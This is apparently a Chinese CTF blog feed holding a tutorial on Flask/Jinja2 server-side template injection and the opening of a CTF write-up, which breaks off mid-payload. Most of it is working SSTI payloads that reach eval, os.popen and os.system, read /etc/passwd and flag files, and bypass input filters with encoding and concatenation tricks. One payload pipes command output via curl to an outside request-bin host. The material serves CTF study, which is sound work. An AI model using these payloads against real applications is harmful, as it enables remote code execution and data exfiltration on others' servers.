    <content type="html"><![CDATA[<h1 id="ssti模板注入知识"><a href="#ssti模板注入知识" class="headerlink" title="ssti模板注入知识"></a>ssti模板注入知识</h1><h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><p>参考资料：</p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html">CTF SSTI(服务器模板注入)</a></p><p><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html">浅析SSTI(python沙盒绕过)</a></p><p><a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">SSTI完全学习</a></p><p>由于ctf常考的ssti为flask/jinja所以以此为例</p><h2 id="渲染模板flask-jinja"><a href="#渲染模板flask-jinja" class="headerlink" title="渲染模板flask/jinja"></a>渲染模板flask/jinja</h2><p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown"><span class="hljs-strong">__dict__</span> 保存类实例或对象实例的属性变量键值对字典<br><span class="hljs-strong">__class__</span>  返回类型所属的对象<br><span class="hljs-strong">__mro__</span>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><span class="hljs-strong">__bases__</span>   返回该对象所继承的基类<br>// <span class="hljs-strong">__base__</span>和<span class="hljs-strong">__mro__</span>都是用来寻找基类的<br><br><span class="hljs-strong">__subclasses__</span>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><span class="hljs-strong">__init__</span>  类的初始化方法<br><span class="hljs-strong">__globals__</span>  对包含函数全局变量的字典的引用<br></code></pre></div></td></tr></table></figure><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>官方的漏洞利用方法：</p><ul><li>{{}}用于将表达式打印到模板输出，比如我们一般在里面输入 2-1 ， 2*2 ，或者是字符串，调用对象的方法，都会渲染出结果- {%%} 主要用来声明变量，也可以用于条件语句和循环语句。 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 遍历数组</span><br>&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125; <br><span class="hljs-comment"># 如果有catch_warnings进行下一步操作</span><br>&#123;% <span class="hljs-keyword">if</span> c.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;<br><span class="hljs-comment"># 遍历c位置的全部模板方法和全局遍历</span><br>  &#123;% <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> c.__init__.__globals__.values() %&#125;<br>    <span class="hljs-comment"># 如果b中有dict字典</span><br>  &#123;% <span class="hljs-keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;<br>    <span class="hljs-comment"># 且eval在其中</span><br>    &#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> b.keys() %&#125;<br>      <span class="hljs-comment"># 执行命令</span><br>      &#123;&#123; b[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;<br>    &#123;% endif %&#125;<br>  &#123;% endif %&#125;<br>  &#123;% endfor %&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></div></td></tr></table></figure>## 判断此处为常见的判断方法![](https://img2020.cnblogs.com/blog/2454260/202107/2454260-20210710010808516-977697115.png)## 攻击流程{{config}}可以获取当前设置，如果题目类似app.config ['FLAG'] = os.environ.pop（'FLAG'），那可以直接访问{{config['FLAG']}}或者{{config.FLAG}}得到flag</li></ul><p>获取基本类</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">&#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">2</span>]<br>&#123;&#125;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]<br><span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]<br><span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]<br>request.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">8</span>] <span class="hljs-comment">//针对jinjia2/flask为[9]适用</span><br></code></pre></div></td></tr></table></figure><p>获取基本类后，继续向下获取基本类(object)的子类</p><figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less"><span class="hljs-selector-tag">object</span><span class="hljs-selector-class">.__subclasses__</span>()<br></code></pre></div></td></tr></table></figure><p>找到重载过的<code>__init__</code>类(在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的)</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">99</span>].__init__<br>&lt;slot <span class="hljs-keyword">wrapper</span> <span class="hljs-string">&#x27;__init__&#x27;</span> <span class="hljs-keyword">of</span> <span class="hljs-string">&#x27;object&#x27;</span> objects&gt;<br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__<br>&lt;unbound <span class="hljs-keyword">method</span> WarningMessage.__init__&gt;<br></code></pre></div></td></tr></table></figure><p>查看其引用<code>__builtins__</code></p><blockquote><p><strong>builtins</strong>即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于<strong>builtins</strong>却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块</p></blockquote><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">&#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">2</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">59</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>[</span></span>&#x27;__builtins__&#x27;]<br></code></pre></div></td></tr></table></figure><p>这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能</p><figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf"><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;F://GetFlag.txt&#x27;</span>).read()<br></code></pre></div></td></tr></table></figure><p>除此外还有其他的调用方式</p><h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><p>上面的方法读文件</p><p>方法1</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span>.__subclasses__()<span class="hljs-selector-attr">[59]</span>.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;file&#x27;</span>]</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>)<span class="hljs-selector-class">.read</span>()    #将read() 修改为 write() 即为写文件<br></code></pre></div></td></tr></table></figure><p>存在的子模块可以通过.index()来进行查询，如果存在的话返回索引，直接调用即可</p><p>方法2</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">&gt;&gt;&gt; &#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">2</span>].<span class="hljs-constructor">__subclasses__()</span>.index(file)<br><span class="hljs-number">40</span><br><span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>)<span class="hljs-literal">[<span class="hljs-number">40</span>]</span>(&#x27;/etc/passwd&#x27;).read<span class="hljs-literal">()</span> #将read<span class="hljs-literal">()</span> 修改为 write<span class="hljs-literal">()</span> 即为写文件<br></code></pre></div></td></tr></table></figure><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="方法1-利用eval-进行命令执行"><a href="#方法1-利用eval-进行命令执行" class="headerlink" title="方法1 利用eval 进行命令执行"></a>方法1 利用eval 进行命令执行</h3><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">&#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">2</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">59</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>[</span></span>&#x27;__builtins__&#x27;]<span class="hljs-literal">[&#x27;<span class="hljs-identifier">eval</span>&#x27;]</span>(&#x27;<span class="hljs-constructor">__import__(<span class="hljs-string">&quot;os&quot;</span>)</span>.popen(<span class="hljs-string">&quot;whoami&quot;</span>).read<span class="hljs-literal">()</span>&#x27;)<br></code></pre></div></td></tr></table></figure><h3 id="方法2-利用warnings-catch-warnings-进行命令执行"><a href="#方法2-利用warnings-catch-warnings-进行命令执行" class="headerlink" title="方法2 利用warnings.catch_warnings 进行命令执行"></a>方法2 利用warnings.catch_warnings 进行命令执行</h3><p>查看<code>warnings.catch_warnings</code>方法的位置</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">&gt;&gt;&gt; <span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>).index(warnings.catch_warnings)<br><span class="hljs-number">59</span><br></code></pre></div></td></tr></table></figure><p>查看<code>linecatch</code>的位置</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>)<span class="hljs-literal">[<span class="hljs-number">59</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span></span>keys<span class="hljs-literal">()</span>.index(&#x27;linecache&#x27;)<br><span class="hljs-number">25</span><br></code></pre></div></td></tr></table></figure><p>查找<code>os</code>模块的位置</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>)<span class="hljs-literal">[<span class="hljs-number">59</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>[</span></span>&#x27;linecache&#x27;].<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__dict__</span>.</span></span>keys<span class="hljs-literal">()</span>.index(&#x27;os&#x27;)<br><span class="hljs-number">12</span><br></code></pre></div></td></tr></table></figure><p>查找<code>system</code>方法的位置(在这里使用<code>os.open().read()</code>可以实现一样的效果,步骤一样,不再复述)</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>)<span class="hljs-literal">[<span class="hljs-number">59</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>[</span></span>&#x27;linecache&#x27;].<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__dict__</span>.</span></span>values<span class="hljs-literal">()</span><span class="hljs-literal">[<span class="hljs-number">12</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__dict__</span>.</span></span>keys<span class="hljs-literal">()</span>.index(&#x27;system&#x27;)<br><span class="hljs-number">144</span><br></code></pre></div></td></tr></table></figure><p>调用<code>system</code>方法</p><figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less"><span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__base__</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;linecache&#x27;</span>]</span><span class="hljs-selector-class">.__dict__</span><span class="hljs-selector-class">.values</span>()<span class="hljs-selector-attr">[12]</span><span class="hljs-selector-class">.__dict__</span><span class="hljs-selector-class">.values</span>()<span class="hljs-selector-attr">[144]</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-selector-tag">root</span><br><span class="hljs-selector-tag">0</span><br></code></pre></div></td></tr></table></figure><h3 id="方法3-利用commands-进行命令执行"><a href="#方法3-利用commands-进行命令执行" class="headerlink" title="方法3 利用commands 进行命令执行"></a>方法3 利用commands 进行命令执行</h3><figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less">&#123;&#125;<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__import__&#x27;</span>]</span>(<span class="hljs-string">&#x27;commands&#x27;</span>)<span class="hljs-selector-class">.getstatusoutput</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>&#123;&#125;<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__import__&#x27;</span>]</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>&#123;&#125;<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__builtins__</span><span class="hljs-selector-class">.__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;id&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br></code></pre></div></td></tr></table></figure><h1 id="基础绕过"><a href="#基础绕过" class="headerlink" title="基础绕过"></a>基础绕过</h1><h2 id="1-过滤-和"><a href="#1-过滤-和" class="headerlink" title="1)过滤[]和."></a>1)过滤[]和.</h2><p>只过滤<code>[]</code></p><blockquote><p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。<br> <code>&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()</code></p></blockquote><p>若<code>.</code>也被过滤，使用原生JinJa2函数<code>|attr()</code><br>将<code>request.__class__</code>改成<code>request|attr(&quot;__class__&quot;)</code></p><h2 id="2-过滤"><a href="#2-过滤" class="headerlink" title="2)过滤_"></a>2)过滤_</h2><p>利用<code>request.args</code>属性<br><code>{{  ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__</code></p><p> 将其中的request.args改为request.values则利用post的方式进行传参</p><h2 id="3-关键字过滤"><a href="#3-关键字过滤" class="headerlink" title="3)关键字过滤"></a>3)关键字过滤</h2><ol><li>base64编码绕过<br> <code>__getattribute__</code>使用实例访问属性时,调用该方法</li></ol><p>例如被过滤掉<code>__class__</code>关键词</p><p><code>{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}</code></p><ol start="2"><li>字符串拼接绕过<br><code>{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}{{[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]}}</code></li></ol><h2 id="4-过滤双括弧"><a href="#4-过滤双括弧" class="headerlink" title="4)过滤双括弧"></a>4)过滤双括弧</h2><p>使用对应if语句<code>{%if ..%}1{% endif %}</code>,例如</p><p><code>{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://http.bin.buuoj.cn/1inhq4f1 -d \`ls / |  grep flag\`;') %}1{% endif %}</code></p><p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</p><p><code>{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}1{% endif %}</code></p><h2 id="5-引号内十六进制绕过"><a href="#5-引号内十六进制绕过" class="headerlink" title="5)引号内十六进制绕过"></a>5)引号内十六进制绕过</h2><p><code>{{"".__class__}}{{""["\x5f\x5fclass\x5f\x5f"]}}</code><br><code>_</code>是<code>\x5f</code>，<code>.</code>是<code>\x2E</code></p><h2 id="6-“-‘-chr等被过滤，无法引入字符串"><a href="#6-“-‘-chr等被过滤，无法引入字符串" class="headerlink" title="6)“ ‘ chr等被过滤，无法引入字符串"></a>6)“ ‘ chr等被过滤，无法引入字符串</h2><ul><li>直接拼接键名</li></ul><figure class="highlight erlang"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">dict</span><span class="hljs-params">(buil=aa,tins=dd)</span>|<span class="hljs-title">join</span><span class="hljs-params">()</span></span><br></code></pre></div></td></tr></table></figure><ul><li>利用<code>string</code>、<code>pop</code>、<code>list</code>、<code>slice</code>、<code>first</code>等过滤器从已有变量里面直接找</li></ul><figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq">(app.__doc__|<span class="hljs-type">list</span>()).pop(<span class="hljs-number">102</span>)|<span class="hljs-type">string</span>()<br></code></pre></div></td></tr></table></figure><ul><li>构造出<code>%</code>和<code>c</code>后，用格式化字符串代替<code>chr</code></li></ul><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">&#123;%<span class="hljs-builtin-name">set</span> <span class="hljs-attribute">udl</span>=dict(a=pc,c=c).values()|join %&#125;      # <span class="hljs-attribute">uld</span>=%c<br>&#123;%<span class="hljs-builtin-name">set</span> <span class="hljs-attribute">i1</span>=dict(a=i1,c=udl%(99)).values()|join %&#125;<br></code></pre></div></td></tr></table></figure><h2 id="7-等被过滤，无法拼接字符串"><a href="#7-等被过滤，无法拼接字符串" class="headerlink" title="7)+等被过滤，无法拼接字符串"></a>7)+等被过滤，无法拼接字符串</h2><ul><li><code>~</code><br> 在jinja中可以拼接字符串</li><li>格式化字符串<br> 同上</li></ul>]]></content>
    
    
    <categories>
      
      <category>信安 CTF 相关知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gxyd-Ez_python</title>
    <link href="/2021/07/10/%E4%BF%A1%E5%AE%89/CTF/Web/gxyd-Ez_python/"/>
    <url>/2021/07/10/%E4%BF%A1%E5%AE%89/CTF/Web/gxyd-Ez_python/</url>
    
    <content type="html"><![CDATA[<h1 id="gxyd-Ez-python"><a href="#gxyd-Ez-python" class="headerlink" title="gxyd-Ez_python"></a>gxyd-Ez_python</h1><h1 id="自我尝试"><a href="#自我尝试" class="headerlink" title="自我尝试"></a>自我尝试</h1><p>进入后只是看到简单的界面</p><p><img src="https://pic.imgdb.cn/item/60eac8865132923bf8bdf86b.png"></p><p>首先还是查看源码，没有任何有效内容，其次进行目录扫描，发现有很多的的200，经过尝试发现是过滤的内容提示。之后发现其后跟2输出为2。初步判定为ssti注入</p><p>由于没怎么接触相关的知识，所以是一边查看资料一边做题的。</p><p>在查看资料之后使用想使用‘’.__mro__按照流程获取。</p><p>过程中发现<code>&#39;</code>,<code>[</code>被过滤，参考绕过方法进行操作后最后得到了如下命令</p><figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf"><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">&quot;/flag&quot;</span>)|attr(<span class="hljs-string">&quot;re&quot;</span>+<span class="hljs-string">&quot;ad()&quot;</span>)<br></code></pre></div></td></tr></table></figure><p>但是返回为空值。之后不清楚如何操作了</p><h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>同样找到了object后，利用常用payload进行改造</p><figure class="highlight django"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> &quot;&quot;.__class__.__mro__.__getitem__(2).__subclasses__() %&#125;</span><span class="xml"> </span><br><span class="xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__ == &quot;catch_warnings&quot; %&#125;</span><span class="xml"></span><br><span class="xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> b <span class="hljs-keyword">in</span> c.__init__.__globals__.values() %&#125;</span><span class="xml"></span><br><span class="xml">            </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><span class="xml"></span><br><span class="xml">                </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> &quot;eval&quot; <span class="hljs-keyword">in</span> b.keys() %&#125;</span><span class="xml"></span><br><span class="xml">                       </span><span class="hljs-template-variable">&#123;&#123;b.eval(request.values.code)&#125;&#125;</span><span class="xml"></span><br><span class="xml">                 </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="xml">   </span><br><span class="xml">            </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="xml"></span><br><span class="xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="xml"></span><br><span class="xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></div></td></tr></table></figure><p>对该payload进行分析</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># &#123;%%&#125;表示</span><br>&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>).__subclasses__() %&#125; <span class="hljs-comment"># 遍历该数组</span><br>    &#123;% <span class="hljs-keyword">if</span> c.__name__ == <span class="hljs-string">&quot;catch_warnings&quot;</span> %&#125;<span class="hljs-comment"># 查看是否有catch_warnings</span><br>        &#123;% <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> c.__init__.__globals__.values() %&#125; <span class="hljs-comment"># 如果有就查看内容</span><br>            &#123;% <span class="hljs-keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;<br>                &#123;% <span 